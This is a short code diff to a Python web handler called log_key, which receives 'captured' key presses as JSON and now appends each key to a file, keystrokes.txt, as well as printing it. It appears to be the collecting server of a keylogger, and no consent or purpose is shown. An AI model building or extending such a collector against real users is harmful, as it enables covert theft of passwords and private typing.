@@ -23,6 +23,10 @@ def log_key():
     # Log the captured key to the console
     data = request.get_json()
     if data and 'key' in data:
+        key = data['key']
+        # Log the key press into a file
+        with open('keystrokes.txt', 'a') as file:
+            file.write(f"{key}\n")
         print(f"Key pressed: {data['key']}")
     return '', 204
 
